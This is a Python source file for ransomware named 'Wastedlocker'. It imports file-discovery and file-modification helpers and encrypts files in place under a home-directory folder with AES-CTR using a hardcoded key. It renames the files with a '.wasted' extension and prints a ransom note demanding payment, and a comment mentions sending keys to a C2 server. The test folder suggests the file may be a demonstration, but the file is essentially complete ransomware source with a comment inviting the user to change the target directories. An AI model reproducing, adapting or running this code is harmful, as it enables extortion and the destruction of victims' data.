#!/usr/bin/env python
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter

import argparse
import os
import sys
import base64

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = '+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key

def rsa_generate_keys():
	# RSA modulus length must be a multiple of 256 and >= 1024
	modulus_length = 256*4 # use larger value in production
	privatekey = RSA.generate(modulus_length, Random.new().read)
	publickey = privatekey.publickey()
	return privatekey, publickey

def rsa_encrypt_message(a_message , publickey):
	encrypted_msg = publickey.encrypt(a_message, 32)[0]
	encoded_encrypted_msg = base64.b64encode(encrypted_msg) # base64 encoded strings are database friendly
	return encoded_encrypted_msg

def rsa_decrypt_message(encoded_encrypted_msg, privatekey):
	decoded_encrypted_msg = base64.b64decode(encoded_encrypted_msg)
	decoded_decrypted_msg = privatekey.decrypt(decoded_encrypted_msg)
	return decoded_decrypted_msg

def get_parser():
    parser = argparse.ArgumentParser(description='Wastedlocker')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    privatekey , publickey = rsa_generate_keys()
    encrypted_key = rsa_encrypt_message(HARDCODED_KEY , publickey) 
    # decrypted_key = rsa_decrypt_message(encrypted_key, privatekey)

    if not decrypt:
        print '''[COMPANY_NAME]

YOUR NETWORK IS ENCRYPTED NOW

USE - TO GET THE PRICE FOR YOUR DATA

DO NOT GIVE THIS EMAIL TO 3RD PARTIES

DO NOT RENAME OR MOVE THE FILE

THE FILE IS ECNRYPTED WITH THE FOLLOWING KEY
[begin_key]{}[end_key]
KEEP IT
'''.format(encrypted_key)

    if decrypt:
        key = HARDCODED_KEY
    else:
        # In real ransomware, this part includes sending encrypted_key and
        # publickey to the C2
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = [os.environ['HOME'] + '/test_ransomware']
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            if decrypt:
                file_original = os.path.splitext(file)[0]
            	os.rename(file, file_original)
                print("File changed from:" + file + " to " + file_original)
            else:
                os.rename(file, file+'.wasted')
                print("File changed from:" + file + " to " + file+'.wasted')

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

if __name__=="__main__":
    main()
